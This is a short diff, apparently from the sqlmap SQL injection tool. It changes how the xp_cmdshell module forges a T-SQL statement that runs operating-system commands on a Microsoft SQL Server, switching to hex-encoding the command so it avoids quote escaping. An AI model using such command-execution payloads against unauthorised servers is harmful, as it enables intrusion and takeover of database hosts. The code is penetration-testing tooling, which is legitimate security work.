@@ -14,6 +14,7 @@ from lib.core.common import popValue
 from lib.core.common import randomStr
 from lib.core.common import readInput
 from lib.core.common import wasLastRequestDelayed
+from lib.core.convert import hexencode
 from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
@@ -148,9 +149,9 @@ class xp_cmdshell:
 
     def xpCmdshellForgeCmd(self, cmd):
         self.__randStr = randomStr(lowercase=True)
-        self.__cmd = unescaper.unescape("'%s'" % cmd)
-        self.__forgedCmd = "DECLARE @%s VARCHAR(8000); " % self.__randStr
-        self.__forgedCmd += "SET @%s = %s; " % (self.__randStr, self.__cmd)
+        self.__cmd = "0x%s" % hexencode(cmd)
+        self.__forgedCmd = "DECLARE @%s VARCHAR(8000);" % self.__randStr
+        self.__forgedCmd += "SET @%s=%s;" % (self.__randStr, self.__cmd)
         self.__forgedCmd += "EXEC %s @%s" % (self.xpCmdshellStr, self.__randStr)
 
         return self.__forgedCmd
